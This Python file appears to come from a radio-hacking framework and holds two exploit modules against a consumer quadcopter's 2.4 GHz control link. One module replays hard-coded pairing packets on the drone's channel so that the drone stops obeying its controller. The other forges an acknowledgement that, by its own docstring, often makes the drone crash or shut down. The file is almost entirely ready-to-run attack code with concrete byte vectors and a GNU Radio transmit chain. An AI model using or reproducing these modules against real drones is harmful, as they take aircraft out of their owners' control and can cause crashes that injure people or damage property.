# -*- coding: UTF-8 -*-
__copyright__ = "E. Borel"
__license__ = "agpl-3.0"
__doc__ = """
Module for NincoAir Quadrone mini
"""

from sploitkit import *
from lib.radio.NincoAirModule import NincoAirModule
from lib.radio.SDRModule import SDRModule

from gnuradio import blocks
from gnuradio import digital
from gnuradio import gr
import osmosdr

class DOSRePair(NincoAirModule):
        """
        Sends pairing requests on an already allocated channel. It then comes that the drone will ignore all new orders coming from the controller on this channel
        Knowing the channel on which the drone operates is required
        """
        path = "exploit/nincoair/quadrone_mini"

        def __init__(self):
                super(DOSRePair, self).__init__()

        def run(self):
                """
                Seds te right pairing request according to 
                """
                super().init()
                if self.osmosdr_sink == None:
                        return
                VECTORS = [
                        self.preamble + self.TXid + [0xcc,0xc9,0xf9,0x1b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7a],
                        self.preamble + self.TXid + [0xca,0x69,0xf9,0x1b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7a],
                        self.preamble + self.TXid + [0xcf,0x91,0xfa,0x5b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7b],
                        self.preamble + self.TXid + [0xc9,0x3d,0xf8,0xbb,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7b],
                        self.preamble + self.TXid + [0xcc,0xc5,0xfb,0xfb,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7a],
                        self.preamble + self.TXid + [0xca,0x65,0xfb,0xfb,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7a],
                        self.preamble + self.TXid + [0xcf,0x9b,0xfa,0x9b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7b],
                        self.preamble + self.TXid + [0xc9,0x33,0xf9,0xdb,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7b],
                        self.preamble + self.TXid + [0xcc,0xcf,0xfb,0x3b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7a],
                        self.preamble + self.TXid + [0xca,0x6f,0xfb,0x3b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7a],
                        self.preamble + self.TXid + [0xcf,0x97,0xf8,0x7b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7b],
                        self.preamble + self.TXid + [0xc9,0x38,0xf8,0xdb,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7b],
                        self.preamble + self.TXid + [0xcc,0xc0,0xfb,0x9b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7a],
                        self.preamble + self.TXid + [0xca,0x60,0xfb,0x9b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7a],
                        self.preamble + self.TXid + [0xcf,0x9c,0xf9,0x7b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7b],
                        self.preamble + self.TXid + [0xc9,0x34,0xfa,0x3b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7b],
                        self.preamble + self.TXid + [0xcc,0xca,0xfb,0x5b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7a],
                        self.preamble + self.TXid + [0xca,0x6a,0xfb,0x5b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7a],
                        self.preamble + self.TXid + [0xcf,0x92,0xf8,0x1b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7b],
                        self.preamble + self.TXid + [0xc9,0x3e,0xfa,0xfb,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7b],
                        self.preamble + self.TXid + [0xcc,0xc6,0xf9,0xbb,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7a],
                        self.preamble + self.TXid + [0xca,0x66,0xf9,0xbb,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7a],
                        self.preamble + self.TXid + [0xcf,0x99,0x79,0xfb,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7b],
                        self.preamble + self.TXid + [0xc9,0x31,0x7a,0xbb,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7b],
                        self.preamble + self.TXid + [0xcc,0xcd,0x78,0x5b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7a],
                        self.preamble + self.TXid + [0xca,0x6d,0x78,0x5b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7a],
                        self.preamble + self.TXid + [0xcf,0x95,0x7b,0x1b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7b],
                        self.preamble + self.TXid + [0xc9,0x3b,0x7a,0x7b,0xf1,0x64,0x10,0xc5,0x3e,0x7d,0x7e,0x85,0xc5,0xe7,0xc9,0x58,0x6c,0x18,0x7b]]
                FREQUENCIES = [2.402e9, 2.405e9, 2.408e9, 2.411e9, 2.414e9, 2.417e9, 2.420e9, 2.423e9, 2.426e9, 2.429e9, 2.432e9, 2.435e9, 2.438e9, 2.441e9, 2.444e9, 2.447e9, 2.450e9, 2.453e9, 2.456e9, 2.459e9, 2.462e9, 2.465e9, 2.468e9, 2.471e9, 2.474e9, 2.477e9, 2.480e9, 2.483e9]
                try:
                        fq = self.osmosdr_sink.get_center_freq()
                        x = FREQUENCIES.index(fq)
                        vector = VECTORS[x]
                except:
                        self.logger.failure("Invalid frequency: must be one of these values ")
                        self.logger.failure(FREQUENCIES)
                        return
                container = gr.top_block()
                digital_gmsk_mod_0_0 = digital.gmsk_mod(samples_per_symbol=self.samp_syms,bt=1,verbose=False,log=False,)
                digital_gmsk_mod_0 = digital.gmsk_mod(samples_per_symbol=self.samp_syms,bt=1,verbose=False,log=False,)
                blocks_vector_source_x_1_1 = blocks.vector_source_b(vector, True, 1, [])
                blocks_vector_source_x_1_0 = blocks.vector_source_c((self.silent,), True, 1, [])
                blocks_vector_source_x_1 = blocks.vector_source_b(vector, True, 1, [])
                blocks_stream_mux_0 = blocks.stream_mux(gr.sizeof_gr_complex*1, (len(vector) * 64, 2500, len(vector) * 64))
                container.connect((blocks_stream_mux_0, 0), (self.osmosdr_sink, 0))
                container.connect((blocks_vector_source_x_1, 0), (digital_gmsk_mod_0, 0))
                container.connect((blocks_vector_source_x_1_0, 0), (blocks_stream_mux_0, 1))
                container.connect((blocks_vector_source_x_1_1, 0), (digital_gmsk_mod_0_0, 0))
                container.connect((digital_gmsk_mod_0, 0), (blocks_stream_mux_0, 0))
                container.connect((digital_gmsk_mod_0_0, 0), (blocks_stream_mux_0, 2))
                container.start()
                self.wait_for_exit()
                container.stop()
                container.wait()
                self.osmosdr_sink.disconnect_all()

class DOSSendACK(NincoAirModule):
        """
        Must be run before turning the controller on. It will send a fake ACK, tricking the controller that 2.402GHz (the lowest channel) is the one to use.
        Makes the behaviour of the drone reallu unstable and often makes it crash (shutdown)
        """
        path = "exploit/nincoair/quadrone_mini"
        def __init__(self):
                super(DOSSendACK, self).__init__()
                self.config[SDRModule.FREQUENCY] = "2.405e9"

        def run(self):
                vector = [204, 197, 195, 167, 243, 164, 16, 160, 134, 45, 120, 132, 185, 169, 169, 88, 108, 24, 122, 62, 30, 102, 127]
                super().run(tuple(self.preamble + self.TXid + vector))
